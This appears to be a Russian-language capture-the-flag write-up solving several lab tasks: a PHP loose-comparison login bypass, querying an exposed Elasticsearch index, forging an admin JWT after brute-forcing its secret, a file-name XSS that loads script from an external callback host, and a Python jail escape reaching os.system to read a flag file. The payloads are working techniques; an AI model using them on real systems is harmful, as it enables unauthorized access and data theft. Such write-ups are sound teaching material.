## 1. Embrace PHP (web)
### Условие:
```
Без комментариев.
**ссылка на index.php**
```
http://109.233.56.93:5004
### Как решать?
Заметим, что в таске нам даны исходники веб-страницы, сначала проанализируем их:

1) На странице у нас находится только html-форма, в которой GET запросом отправляются логин и пароль. Логин и пароль перед отправкой [сериализуются](https://ru.stackoverflow.com/questions/477425/%D0%A1%D0%B5%D1%80%D0%B8%D0%B0%D0%BB%D0%B8%D0%B7%D0%B0%D1%86%D0%B8%D1%8F-%D0%BF%D1%80%D0%BE%D1%81%D1%82%D1%8B%D0%BC%D0%B8-%D1%81%D0%BB%D0%BE%D0%B2%D0%B0%D0%BC%D0%B8) в `JSON`
```
<form method=GET onsubmit="login_data.value = JSON.stringify([ inputLogin.value, inputPassword.value ]);">
```

2) На бэкенде `JSON`, полученный из GET запроса десериализуется (`@json_decode`) в переменные `$login` и `$password`. Затем происходит сверка логина со строкой `admin` и пароля с [переменной окружения](https://ru.hexlet.io/courses/cli-basics/lessons/environment-variables/theory_unit) `ADMIN_PASSW`, которую мы не знаем. Если сверка успешна, флаг `isAdmin` становится равным `true`. (Обратите внимание, здесь не создается сессии, т.к нет инструкции `start_session()` - т.е $_SESSION это просто переменная)
```
<?php

if (isset($_REQUEST['login_data'])) {
    $json = @json_decode($_REQUEST['login_data']);
    if (!is_array($json) || count($json) < 2)
        exit('Error Json need to have 2 elements!');
    $json = array_values($json);
    list($login, $password) = $json;

    if (
        $login == 'admin' &
        $password == getenv('ADMIN_PASSW')
    )
        $_SESSION['isAdmin'] = true;
    else
        $_SESSION['isAdmin'] = false;
}
?>
```

3) Далее проверяется что флаг `isAdmin` существует и равен `true`. Если эти условия соблюдены - нам выводится флаг (он тоже находится в переменных окружения).
```
<?php
    if (isset($_SESSION['isAdmin']) && $_SESSION['isAdmin']) {
        ?>
        <p>Success YOURa ADMIN!!01!</p>
        <p>Your flag: <?=getenv('FLAG');?></p>
```

Теперь переходим на сайт и видим что кроме некоторых украшений код остался таким же. (Можно нажать на слоника и получить забавный звуковой эффект)

![](https://i.imgur.com/lrbNg8D.png)

Проведя сложные логические вычисления

![](https://www.meme-arsenal.com/memes/570122be3f390e1db0ec7f124311f1f6.jpg)

можно понять, что нам необходимо как-то получить `true` при сравнение нашего пароля и неизвестного нам пароля админа. Читая про уязвимости в PHP (рекомендую этот [доклад](https://2018.zeronights.ru/wp-content/uploads/materials/8%20ZN2018%20WV%20-%20PHP%20insecurity%20stack%20%28RU%29.pdf)) легко находится, что в данном случае у нас уязвимость [Type juggling](https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09#:~:text=PHP%20has%20a%20feature%20called,to%20a%20common%2C%20comparable%20type.&text=Loose%20type%20comparison%20behavior%20like,work%20in%20the%20same%20way.) (В PHP слабая типизация, а значит сравнение `==` не всегда безопасно)

Основываясь на таблице

![](https://api.abrictosecurity.com/wp-content/uploads/2020/08/loose-1.png)

делаем вывод, что чтобы при сравнении с паролем админа (а это строка) результатом был `true` нам нужно подать на вход `0` или `TRUE`. 

Просто так это сделать не получиться, ведь данные сериализуются в JSON (`TRUE` как и `0` превратятся в строку при отправке). И тут у нас несколько вариантов:
1) Перехватить запрос и просто поменять строку на `0` или `true`
2) Отправить запрос самому
3) ХТМЛ ХакККинГ (Advanced, требуются серьезные знания html)

![](https://i.imgur.com/yprPOu8.png)
*ПКМ -> Edit as html -> ... -> profit!*

Выбираем любой способ и получаем флаг. (лично мне нравится 3ий за его неописуемую сложность)


## 2. Strange service (web)
### Условие:

```
Мы обнаружили в сети какой-то странный сервис. Что же это может быть?
```
http://109.233.56.93:9200
### Как решать?

Сделаем GET запрос на выданный адрес и получим жсон вида:
```
{
  "name" : "2878cfce301b",
  "cluster_name" : "docker-cluster",
  "cluster_uuid" : "NdDoTUU6Q4-m9HVwsskcjw",
  "version" : {
    "number" : "7.10.1",
    "build_flavor" : "default",
    "build_type" : "docker",
    "build_hash" : "1c34507e66d7db1211f66f3513706fdf548736aa",
    "build_date" : "2020-12-05T01:00:33.671820Z",
    "build_snapshot" : false,
    "lucene_version" : "8.7.0",
    "minimum_wire_compatibility_version" : "6.8.0",
    "minimum_index_compatibility_version" : "6.0.0-beta1"
  },
  "tagline" : "You Know, for Search"
}
```

По полученному сложно сразу сказать что это такое, но можно попробовать загуглить ключевые слова, возможно это что-то даст. Однозначный успех ждет нас на теге `"tagline"`

![](https://i.imgur.com/Wz9oFZI.png)

> Вторым способом понять, что за сервис находится по данному url это заметить необычный порт (`9200` хотя все остальные сервисы расположены на `5000N` порту). Загуглив какой сервис обычно располагается на 9200 порту узнаем, что это `ElasticSearch`

Сервис мы определили, теперь нужно понять как с ним работать. Хорошей идеей было бы нагуглить статью об этом, одной из первых ссылок в выдаче будет [эта](https://habr.com/ru/post/280488/). Из нее легко понять, что `ElasticSearch` это NoSql база данных, используемая для поиска.

Далее, читая статью, разбираемся с основными понятиями - индексом и типом. 

![](https://i.imgur.com/XKt6SxY.png)

Получим маппинг нашей бд, благо пример указан прямо в статье - http://109.233.56.93:9200/_mapping?pretty=true (да, запрос работает и без индекса в пути, но можно и получить имя индекса заранее по запросу `/_cat/indices?v`)

```
{
  "flag" : {
    "mappings" : {
      "properties" : {
        "content" : {
          "type" : "text",
          "fields" : {
            "keyword" : {
              "type" : "keyword",
              "ignore_above" : 256
            }
          }
        },
        "title" : {
          "type" : "text",
          "fields" : {
            "keyword" : {
              "type" : "keyword",
              "ignore_above" : 256
            }
          }
        }
      }
    }
  }
}
```

Мы получили маппинг, сразу замечаем, что наш индекс это `flag` (если не обнаружили ранее) и у него есть поля `content` и `tittle`. Но вот незадача, имя типа, которе нужно для получения документов мы не узнали. Обратившись к [документации](https://www.elastic.co/guide/en/elasticsearch/reference/6.8/indices-get-mapping.html)

![](https://i.imgur.com/KgwIdHY.png)

Находим, что для получения типа нам нужно указать параметр `include_type_name=true`

Тогда наш новый запрос - http://109.233.56.93:9200/flag/_mappings?include_type_name=true
```
{
  "flag" : {
    "mappings" : {
      "post" : {
        "properties" : {
            ...
```

Наш маппинг `post`, прямо как и в статье!

Дело за малым, идем на `/flag/post/1?pretty` и получаем одну запись:
```
{
  "_index" : "flag",
  "_type" : "post",
  "_id" : "1",
  "_version" : 1,
  "_seq_no" : 0,
  "_primary_term" : 1,
  "found" : true,
  "_source" : {
    "title" : "Flag may be here",
    "content" : "well, not here"
  }
}
```
Теперь осталось перебрать все записи и найти флаг!

Но можно и поступить проще - сделать поисковой запрос (`ElasticSearch` предназначен для поиска как-никак!)

Отправим данный запрос
```
curl -XGET -H 'Content-Type: application/json' "http://109.233.56.93:9200/flag/post/_search?pretty" -d'
{
  "_source": true,
  "query": {
    "match": {
      "content": "CYBERTHON"
    }
  }
}'
```
и получим флаг.


## 3. Anime advisor (1) (web)
### Условие:
```
Мой знакомый разрабатывает сайт "для своих". Я туда, конечно, заходить не собираюсь, но вы проверьте, достаточно ли он защищен.

P.S В данном задании два флага. (последний символ флага в данном задании - S)
```
http://109.233.56.93:5001

### Как решать?

Заходим на сайт и наслаждаемся качественной версткой и шрифтами:

![img](https://i.imgur.com/pJvZ2Mu.png)

Тыкаем кнопочки, изучаем респонсы. Форма обратной связи намекает нам о наличии клиентской уязвимости, но рассматривать мы ее здесь не будем, в ней находится второй флаг. 

Рассмотрим все эндпоинты:

1) Main page - `/` ничего интересного
2) News - `/api/news` - кросдоменный запрос на новости. Замечаем что есть `/api `
3) Sign In - заглушка, выводит `Coming soon!`
4) Select anime - `/get_anime` выдает картинку, причем передается только тип, никаких названий, так что LFI тут будет вряд ли.

При анализе ответов сервера, можно заметить, что они все отдают кастомный http заголовок: `x-server-name: FastAPI`. Гуглим и понимаем, что это фреймворк на котором написан сайт.

![](https://i.imgur.com/csm9l2k.png)

Посмотрим, что же умеет это чудо:

![](https://i.imgur.com/gVrgIAK.png)

Бинго! Автоматическая генерация документации!

> `/docs` можно было найти и любой брутилкой директорий (`dirb`, `dirsearch`)

Посмотрим `/docs` на нашем сайте:

![img](https://i.imgur.com/rReTjbc.png)

Кроме уже известного нам эндпоинта `/api/news` здесь находятся еще  `test_register` и `test_login`. Рассмотрим их внимательнее:

* `/api/test_register` принимает POST запрос с одним полем `name` (похоже на имя пользователя) и возвращает строку вида: `"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWE2NjIyZWQ4M2I3NGNlNjlmODI2MTdkYTY0NjhjNjIiLCJuYW1lIjoic3RyaW5nIiwiaXNfYWRtaW4iOmZhbHNlfQ.br4rkubzQV5ygchy9waVXy0lSEugpHYtDY2Ufxm4BQw"`
Если попробовать загуглить данную строку, то вы поймете что это обычный [jwt-токен](https://ru.wikipedia.org/wiki/JSON_Web_Token)
* `/api/test_login` принимает POST запрос с токеном, выданным ранее.

Получив токен и попробовав залогиниться увидим сообщение - `"You have successfully logined"`. Флага тут нет, так что надо копать глубже. Обратим наше внимание на токен. Так как `jwt token` это просто три части base64 - расшифруем его:
```
{"typ":"JWT","alg":"HS256"}.{"user_id":"aa6622ed83b74ce69f82617da6468c62","name":"string","is_admin":false}.%digest_bytes_here%
```

Сразу замечаем, что помимо нашего `name` в токен записывается поле `is_admin` равное `false`. Токен админа мы не знаем, но можем попробовать подменить поле в нашем токене. Для этого удобно использовать [jwt_tool](https://github.com/ticarpi/jwt_tool) и атаки на `jwt-token` (хорошо описаны [здесь](https://github.com/ticarpi/jwt_tool/wiki)) 

Использовав `jwt_tool` можно попробовать подменить подпись токена на `None`. Но к сожалению данный способ не срабатывает. Попробуем перебрать пароль при помощи любого крупного словаря, например `rockyou.txt`:

![](https://imgur.com/IL3zwMw.png)

Отлично, секретный ключ, которым был подписан токен - это `secret`. Теперь мы можем перезаписать свой токен (опция `-T` в `jwt_tool`) и поставить поле `is_admin` равным `true`. Отправляем логин запрос с новым токеном и получаем флаг.

> В данном таске проэмулирована вполне реальная ситуация - когда разработчик сделал тестовые методы, но билд почему-то попал в продакшн и стал доступен извне. 

## 4. Anime advisor (2) (web)
### Условие:
```
Мой знакомый разрабатывает сайт "для своих". Я туда, конечно, заходить не собираюсь, но вы проверьте, достаточно ли он защищен.

P.S В данном задании два флага. (последний символ флага в данном задании - e)
```
http://109.233.56.93:5001
### Как решать?

Теперь обратим внимание на форму обратной связи:

![](https://imgur.com/mqElvuY.png)

В ней есть заголовок, тело и опциональная загрузка изображения. Попробовав засунуть `XSS` пейлоады в заголовок и тело (Админу они вероятно отображаются на какой-то специальной странице) получим ошибку, которая говорит нам о том, что спец-символы в этих полях не допускаются.

![](https://imgur.com/W6KfMj4.png)

Остается поиграться с файлом и тут два варианта:
1) Наличие какой-то уязвимости в рендере файла<br>
Тут потенциально может быть много вещей, но нет ничего, чтобы на них намекало. Простое > лучше сложного, да и я не люблю делать таски с уцуцугой. (Скорее всего файл просто отображается на странице админа)
> Во время соревнований были залиты довольно интересные файлы: `'getenv('FLAG').txt`, `A3DLIBS.dll`, `payload.html`, `hey.php.png` и даже `alpine.ova`)))
2) XSS в имени файла<br>
А вот о такой возможности часто забывают. В данном задании необходимо было сделать именно это. Единственным ограничением была длина имени файла - 60 символов. Благо html и js богаты на различные способы сделать XSS. Самым простым и коротким пожалуй является этот: `<script src=url></script>`. Ну а в url уже ваш адрес, на который должен прийти отстук ( сервисов, позволяющих сделать подобный url много, например `requestbin` и `xss-hunter`)

> Посмотреть на варианты XSS пейлоадов можно [тут](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)

Отправив наш пейлоад получим отстук (я воспользовался сервисом `xss-hunter`):

![](https://imgur.com/4L4PhXf.png)



## 5. Chess bot (joy)
### Условие:
```
Уже смотрели Ход Королевы? Да, мне тоже понравилось. Скорее пиши @chess_lover_bot чтобы попрактиковаться в шахматах!

P.S режим - antichess
P.P.S Нолан - Гений
```
### Как решать?

Заходим в бота. Регистрируемся на https://lichess.org/. Не забываем при каждый новой победе над ботом тыкнуть кнопку. Все

## 6. Escape from durka (ppc)
### Условие:
```
nc 109.233.56.93 5005

P.S В задании есть второй флаг, однако получить его невозможно. Но вы все равно попробуйте.
```
### Как решать?

Подсоединяемся неткатом к серверу. После пары команд понимаем, что мы находимся в питон джейле.

После пары тестов выясняем, что наш инпут оборачивается в `print()` и суется в `eval()`
```
>>> 'test'
test
>>> 'test'[0]
t
```
Попробуем что-нибудь классическое:
```
>>> __import__('os')
Ага, попался! В процедурную его, в процедурную.
```
Не вышло, значит скорее всего некоторые символы фильтруются (тестируем это на обычной строке). Методом проб и ошибок выясняем, что это `."_` и пробел.

Пробуем eval:
```
>>> eval('1'+'1')
С такими приколами (name 'eval' is not defined) тебе сам знаешь куда.
```

`'eval' is not defined.` Хм, пробуем еще парочку стандартных функций, они тоже не проходят. Дальше можно пробовать перебирать все остальное (благо встроенных глобальных функций в питоне не очень много) или попробовать сразу написать `globals()` - встроенная функция, которая возвращает все глобальные объекты:
```
>>> globals()
{'__builtins__': {'print': <built-in function print>, 'globals': <built-in function globals>, 'locals': <built-in function locals>, 'getattr': <built-in function getattr>}}
```
Теперь мы можем убедиться, что нам доступны `print`, `globals`, `locals` и `gettattr`.  

Что делают `print` и `globals` мы уже выяснили. `getattr` позволяет нам получить атрибут объекта не через `.` .Удобненько. А вот `locals` по аналогии с глобалами позволяет нам получить все локальные переменные

```
>>> locals()
{'kolpak': <function f at 0x7fa468a4a3a0>, 'text': 'locals()'}
```

Опа, колпак. Какая-то функция, интересно. Ее можно поизучать. 

```
>>> kolpak()
Otdai kolpak!
```

Функция не принимает аргументов и просто возвращает строку. Казалось бы, что еще можно узнать. Оказывается много чего! В деталях я описывать не буду, но вы можете прочитать подробнее [здесь](https://www.aperikube.fr/docs/inshack_2019/hell_of_a_jail/), а я ограничусь тем, что выведу все константные значения функции:
```
>>> getattr(getattr(kolpak,'\x5f\x5fcode\x5f\x5f'),'co\x5fconsts')
(None, 'CYBERTHON{P0we3_0f_Pyt40n_1ntr0Spec4i0n}', 'Otdai kolpak!')
```

> Здесь запрет на `_` был обойден при помощи hex-кода числа - `\x5f`

В данном задании находился и второй флаг, но уже не в коде программы, а в файловой системе. Пользуясь тем, что можно обойти запрет `_` а так же тем, что пустая строка вполне себе объект, у которого есть родители: 
```
__class__.__mro__[1] -> выходим на object
.__subclasses__() -> выходим на все классы
```

Мы можем получить доступ к модулю os, а затем уже вызывать любые системные команды:
```
getattr(getattr(getattr(getattr(getattr('','\x5f\x5fclass\x5f\x5f'),'\x5f\x5fmro\x5f\x5f')[1],'\x5f\x5fsubclasses\x5f\x5f')()[84],'load\x5fmodule')('os'),'system')('cat\x20flag\x2etxt')
```

`P.S` Один участник нашел еще один интересный способ получить доступ к классам:
```
getattr(globals(),'popitem')()
```
после запуска этой команды заместо нашего урезанно `__builtins__` придет дефолтный, со всеми классами. А дальше уже по накатанной.